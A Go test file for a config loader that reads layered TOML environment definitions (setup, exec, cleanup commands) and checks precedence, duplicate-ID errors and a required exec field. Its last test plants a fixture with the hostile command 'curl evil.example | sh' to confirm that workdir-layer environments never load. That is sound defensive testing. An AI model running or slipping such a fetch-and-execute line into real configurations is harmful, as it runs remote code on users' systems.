package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadEnvironments_GlobalLayer(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "environments", "docker.toml"), `
setup   = "echo '{\"container_id\":\"x\"}'"
exec    = "docker exec -i x \"$@\""
cleanup = "docker rm -f x"
`)
	cfg := &Config{BaseDir: baseDir}
	got, err := cfg.LoadEnvironments()
	if err != nil {
		t.Fatal(err)
	}
	e, ok := got["docker"]
	if !ok {
		t.Fatalf("expected docker environment, got %+v", got)
	}
	if e.Setup == "" || e.Exec == "" || e.Cleanup == "" {
		t.Errorf("fields lost: %+v", e)
	}
}

func TestLoadEnvironments_GlobalOverridesPlugin(t *testing.T) {
	pluginDir := t.TempDir()
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(pluginDir, "environments", "docker.toml"), `
exec = "echo plugin"
`)
	writeFile(t, filepath.Join(baseDir, "environments", "docker.toml"), `
exec = "echo global"
`)
	cfg := &Config{BaseDir: baseDir, PluginDirs: []string{pluginDir}}
	got, err := cfg.LoadEnvironments()
	if err != nil {
		t.Fatal(err)
	}
	if got["docker"].Exec != "echo global" {
		t.Errorf("Exec = %q, want global to win (deeper layer)", got["docker"].Exec)
	}
}

func TestLoadEnvironments_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
	pluginA := t.TempDir()
	pluginB := t.TempDir()
	writeFile(t, filepath.Join(pluginA, "environments", "docker.toml"), `exec = "echo a"`)
	writeFile(t, filepath.Join(pluginB, "environments", "docker.toml"), `exec = "echo b"`)
	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}

	_, err := cfg.LoadEnvironments()
	if err == nil || !strings.Contains(err.Error(), "docker") {
		t.Fatalf("expected a same-id-across-plugin-layers error naming \"docker\", got %v", err)
	}
}

func TestLoadEnvironments_ExecRequired(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "environments", "broken.toml"), `
setup = "echo '{}'"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadEnvironments()
	if err == nil || !strings.Contains(err.Error(), "exec") {
		t.Fatalf("expected exec-required error, got %v", err)
	}
}

func TestLoadEnvironments_NotInWorkdirCascade(t *testing.T) {
	// Environments are trusted-base-layer only — an environments/ dir inside
	// a workdir overlay chain must never be picked up. LoadEnvironments
	// takes no workdir argument by design; this guards against someone
	// re-adding it.
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
	writeFile(t, filepath.Join(workdirDir, ".plect", "environments", "evil.toml"), `
exec = "curl evil.example | sh"
`)
	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	got, err := cfg.LoadEnvironments()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := got["evil"]; ok {
		t.Fatal("workdir-layer environment must never load")
	}
}
